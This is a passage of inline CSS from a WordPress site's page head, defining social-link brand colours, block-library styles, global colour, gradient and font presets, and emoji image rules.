.wp-social-link-fivehundredpx{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-flickr{background-color:#0461dd;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-foursquare{background-color:#e65678;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-github{background-color:#24292d;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-goodreads{background-color:#eceadd;color:#382110}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-google{background-color:#ea4434;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-gravatar{background-color:#1d4fc4;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-instagram{background-color:#f00075;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-lastfm{background-color:#e21b24;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-linkedin{background-color:#0d66c2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-mastodon{background-color:#3288d4;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-medium{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-meetup{background-color:#f6405f;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-patreon{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-pinterest{background-color:#e60122;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-pocket{background-color:#ef4155;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-reddit{background-color:#ff4500;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-skype{background-color:#0478d7;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-snapchat{background-color:#fefc00;color:#fff;stroke:#000}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-soundcloud{background-color:#ff5600;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-spotify{background-color:#1bd760;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-telegram{background-color:#2aabee;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-threads{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-tiktok{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-tumblr{background-color:#011835;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-twitch{background-color:#6440a4;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-twitter{background-color:#1da1f2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-vimeo{background-color:#1eb7ea;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-vk{background-color:#4680c2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-wordpress{background-color:#3499cd;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-whatsapp{background-color:#25d366;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-x{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-yelp{background-color:#d32422;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-youtube{background-color:red;color:#fff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link{background:none}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link svg{height:1.25em;width:1.25em}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-amazon{color:#f90}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-bandcamp{color:#1ea0c3}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-behance{color:#0757fe}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-bluesky{color:#0a7aff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-codepen{color:#1e1f26}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-deviantart{color:#02e49b}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-discord{color:#5865f2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-dribbble{color:#e94c89}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-dropbox{color:#4280ff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-etsy{color:#f45800}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-facebook{color:#0866ff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-fivehundredpx{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-flickr{color:#0461dd}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-foursquare{color:#e65678}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-github{color:#24292d}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-goodreads{color:#382110}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-google{color:#ea4434}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-gravatar{color:#1d4fc4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-instagram{color:#f00075}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-lastfm{color:#e21b24}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-linkedin{color:#0d66c2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-mastodon{color:#3288d4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-medium{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-meetup{color:#f6405f}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-patreon{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-pinterest{color:#e60122}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-pocket{color:#ef4155}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-reddit{color:#ff4500}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-skype{color:#0478d7}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-snapchat{color:#fff;stroke:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-soundcloud{color:#ff5600}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-spotify{color:#1bd760}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-telegram{color:#2aabee}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-threads{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-tiktok{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-tumblr{color:#011835}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-twitch{color:#6440a4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-twitter{color:#1da1f2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-vimeo{color:#1eb7ea}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-vk{color:#4680c2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-whatsapp{color:#25d366}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-wordpress{color:#3499cd}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-x{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-yelp{color:#d32422}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-youtube{color:red}.wp-block-social-links.is-style-pill-shape .wp-social-link{width:auto}:root :where(.wp-block-social-links .wp-social-link a){padding:.25em}:root :where(.wp-block-social-links.is-style-logos-only .wp-social-link a){padding:0}:root :where(.wp-block-social-links.is-style-pill-shape .wp-social-link a){padding-left:.6666666667em;padding-right:.6666666667em}.wp-block-social-links:not(.has-icon-color):not(.has-icon-background-color) .wp-social-link-snapchat .wp-block-social-link-label{color:#000}
/*# sourceURL=/wp-includes/blocks/social-links/style.min.css */
</style>
<style id="wp-block-library-inline-css">
:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;word-wrap:normal!important}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
</style>
<style id="global-styles-inline-css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--base: #1B1B1B;--wp--preset--color--contrast: #F0F0F0;--wp--preset--color--accent-1: #786D0A;--wp--preset--color--accent-2: #442369;--wp--preset--color--accent-3: #D1D0EA;--wp--preset--color--accent-4: #CBCBCB;--wp--preset--color--accent-5: #353535;--wp--preset--color--accent-6: #FFFFFF33;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 0.875rem;--wp--preset--font-size--medium: clamp(1rem, 1rem + ((1vw - 0.2rem) * 0.196), 1.125rem);--wp--preset--font-size--large: clamp(1.125rem, 1.125rem + ((1vw - 0.2rem) * 0.392), 1.375rem);--wp--preset--font-size--x-large: clamp(1.75rem, 1.75rem + ((1vw - 0.2rem) * 0.392), 2rem);--wp--preset--font-size--xx-large: clamp(2.15rem, 2.15rem + ((1vw - 0.2rem) * 1.333), 3rem);--wp--preset--font-family--manrope: Manrope, sans-serif;--wp--preset--font-family--fira-code: "Fira Code", monospace;--wp--preset--spacing--20: 10px;--wp--preset--spacing--30: 20px;--wp--preset--spacing--40: 30px;--wp--preset--spacing--50: clamp(30px, 5vw, 50px);--wp--preset--spacing--60: clamp(30px, 7vw, 70px);--wp--preset--spacing--70: clamp(50px, 7vw, 90px);--wp--preset--spacing--80: clamp(70px, 10vw, 140px);--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:root { --wp--style--global--content-size: 800px;--wp--style--global--wide-size: 1340px; }:where(body) { margin: 0; }.wp-site-blocks { padding-top: var(--wp--style--root--padding-top); padding-bottom: var(--wp--style--root--padding-bottom); }.has-global-padding { padding-right: var(--wp--style--root--padding-right); padding-left: var(--wp--style--root--padding-left); }.has-global-padding > .alignfull { margin-right: calc(var(--wp--style--root--padding-right) * -1); margin-left: calc(var(--wp--style--root--padding-left) * -1); }.has-global-padding :where(:not(.alignfull.is-layout-flow) > .has-global-padding:not(.wp-block-block, .alignfull)) { padding-right: 0; padding-left: 0; }.has-global-padding :where(:not(.alignfull.is-layout-flow) > .has-global-padding:not(.wp-block-block, .alignfull)) > .alignfull { margin-left: 0; margin-right: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 1.2rem; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 1.2rem; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 1.2rem;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 1.2rem;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 1.2rem;}:root :where(.is-layout-grid){gap: 1.2rem;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{background-color: var(--wp--preset--color--base);color: var(--wp--preset--color--accent-4);font-family: var(--wp--preset--font-family--manrope);font-size: var(--wp--preset--font-size--large);font-weight: 300;letter-spacing: -0.1px;line-height: 1.4;--wp--style--root--padding-top: 0px;--wp--style--root--padding-right: var(--wp--preset--spacing--50);--wp--style--root--padding-bottom: 0px;--wp--style--root--padding-left: var(--wp--preset--spacing--50);}a:where(:not(.wp-element-button)){color: #0099ff;text-decoration: underline;}:root :where(a:where(:not(.wp-element-button)):hover){text-decoration: none;}h1, h2, h3, h4, h5, h6{font-weight: 400;letter-spacing: -0.1px;line-height: 1.125;}h1{font-size: var(--wp--preset--font-size--xx-large);}h2{font-size: var(--wp--preset--font-size--x-large);}h3{font-size: var(--wp--preset--font-size--large);}h4{font-size: var(--wp--preset--font-size--medium);}h5{font-size: var(--wp--preset--font-size--small);letter-spacing: 0.5px;}h6{font-size: var(--wp--preset--font-size--small);font-weight: 700;letter-spacing: 1.4px;text-transform: uppercase;}:root :where(.wp-element-button, .wp-block-button__link){background-color: var(--wp--preset--color--contrast);border-width: 0;color: var(--wp--preset--color--base);font-family: inherit;font-size: var(--wp--preset--font-size--medium);font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: 0.6rem;padding-right: 1.6rem;padding-bottom: 0.6rem;padding-left: 1.6rem;text-decoration: none;text-transform: inherit;}:root :where(.wp-element-button:hover, .wp-block-button__link:hover){background-color: color-mix(in srgb, var(--wp--preset--color--contrast) 85%, transparent);border-color: transparent;color: var(--wp--preset--color--base);}:root :where(.wp-element-button:focus, .wp-block-button__link:focus){outline-color: var(--wp--preset--color--accent-4);outline-offset: 2px;}:root :where(.wp-element-caption, .wp-block-audio figcaption, .wp-block-embed figcaption, .wp-block-gallery figcaption, .wp-block-image figcaption, .wp-block-table figcaption, .wp-block-video figcaption){font-size: var(--wp--preset--font-size--small);line-height: 1.4;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-base-color{color: var(--wp--preset--color--base) !important;}.has-contrast-color{color: var(--wp--preset--color--contrast) !important;}.has-accent-1-color{color: var(--wp--preset--color--accent-1) !important;}.has-accent-2-color{color: var(--wp--preset--color--accent-2) !important;}.has-accent-3-color{color: var(--wp--preset--color--accent-3) !important;}.has-accent-4-color{color: var(--wp--preset--color--accent-4) !important;}.has-accent-5-color{color: var(--wp--preset--color--accent-5) !important;}.has-accent-6-color{color: var(--wp--preset--color--accent-6) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-base-background-color{background-color: var(--wp--preset--color--base) !important;}.has-contrast-background-color{background-color: var(--wp--preset--color--contrast) !important;}.has-accent-1-background-color{background-color: var(--wp--preset--color--accent-1) !important;}.has-accent-2-background-color{background-color: var(--wp--preset--color--accent-2) !important;}.has-accent-3-background-color{background-color: var(--wp--preset--color--accent-3) !important;}.has-accent-4-background-color{background-color: var(--wp--preset--color--accent-4) !important;}.has-accent-5-background-color{background-color: var(--wp--preset--color--accent-5) !important;}.has-accent-6-background-color{background-color: var(--wp--preset--color--accent-6) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-base-border-color{border-color: var(--wp--preset--color--base) !important;}.has-contrast-border-color{border-color: var(--wp--preset--color--contrast) !important;}.has-accent-1-border-color{border-color: var(--wp--preset--color--accent-1) !important;}.has-accent-2-border-color{border-color: var(--wp--preset--color--accent-2) !important;}.has-accent-3-border-color{border-color: var(--wp--preset--color--accent-3) !important;}.has-accent-4-border-color{border-color: var(--wp--preset--color--accent-4) !important;}.has-accent-5-border-color{border-color: var(--wp--preset--color--accent-5) !important;}.has-accent-6-border-color{border-color: var(--wp--preset--color--accent-6) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-xx-large-font-size{font-size: var(--wp--preset--font-size--xx-large) !important;}.has-manrope-font-family{font-family: var(--wp--preset--font-family--manrope) !important;}.has-fira-code-font-family{font-family: var(--wp--preset--font-family--fira-code) !important;}img.aligncenter{margin-left:auto;margin-right:auto;display:block;max-width:100%;height:auto;}

th, td {
  border-bottom: 1px solid #404040;
padding: 5px;
}

strong {
  font-weight: bold;
}

pre {
  font-size: 18px;
  background-color: #101010;
  white-space: pre-wrap;
  word-break: keep-all; 
  border-radius: 8px;
  padding: 1em;
  color: #fff;
  font-weight: normal;
  font-family: "Source Code Pro", monospace;
  text-rendering: optimizeLegibility;
}

h1 {
  font-size: 2.5em;
}

h2 {
  font-size: 2em;
}
h3 {
  font-size: 1.75em;
}

h4 {
  font-size: 1.5em;
}

h5 {
  font-size: 1.25em;
}

h6 {
  font-size: 1em;
}
:root :where(.wp-block-post-date){color: var(--wp--preset--color--accent-4);font-size: var(--wp--preset--font-size--small);}
:root :where(.wp-block-post-date a:where(:not(.wp-element-button))){color: var(--wp--preset--color--accent-4);text-decoration: none;}
:root :where(.wp-block-post-date a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
:root :where(.wp-block-post-navigation-link){font-size: var(--wp--preset--font-size--medium);}
:root :where(.wp-block-post-terms){font-size: var(--wp--preset--font-size--small);font-weight: 600;}:root :where(.wp-block-post-terms a){white-space: nowrap;}
:root :where(.wp-block-post-title a:where(:not(.wp-element-button))){text-decoration: none;}
:root :where(.wp-block-post-title a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
:root :where(.wp-block-site-title){font-weight: 700;letter-spacing: -.5px;}
:root :where(.wp-block-site-title a:where(:not(.wp-element-button))){text-decoration: none;}
:root :where(.wp-block-site-title a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
:root :where(.wp-block-navigation){font-size: var(--wp--preset--font-size--medium);}
:root :where(.wp-block-navigation a:where(:not(.wp-element-button))){text-decoration: none;}
:root :where(.wp-block-navigation a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
/*# sourceURL=global-styles-inline-css */
</style>
<style id="block-style-variation-styles-inline-css">
:root :where(.is-style-post-terms-1--1 a:where(:not(.wp-element-button))){border-radius: 20px;border-color: var(--wp--preset--color--accent-6);border-width: 0.8px;border-style: solid;font-weight: 400;line-height: 2.8;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;text-decoration: none;}:root :where(.is-style-post-terms-1--1 a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
/*# sourceURL=block-style-variation-styles-inline-css */
</style>
<style id="wp-emoji-styles-inline-css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
/*# sourceURL=wp-emoji-styles-inline-css */
</style>
<style id="core-block-supports-inline-css">
